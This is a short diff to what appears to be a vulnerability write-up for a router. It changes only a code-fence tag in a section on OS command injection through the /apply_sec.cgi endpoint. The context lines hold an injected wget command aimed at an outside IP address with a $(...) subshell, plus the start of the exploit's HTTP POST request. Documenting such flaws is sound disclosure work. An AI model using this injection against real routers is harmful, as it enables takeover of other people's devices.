@@ -8,7 +8,7 @@ weight = 5
 ## OS Command Injection
 
 Make an HTTP POST request to the router, replacing "{URL_ENCODED_CMD}" with the desired command to run on the router like `wget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234)`
-```
+```sh
 POST /apply_sec.cgi HTTP/1.1
 Host: 192.168.232.128
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
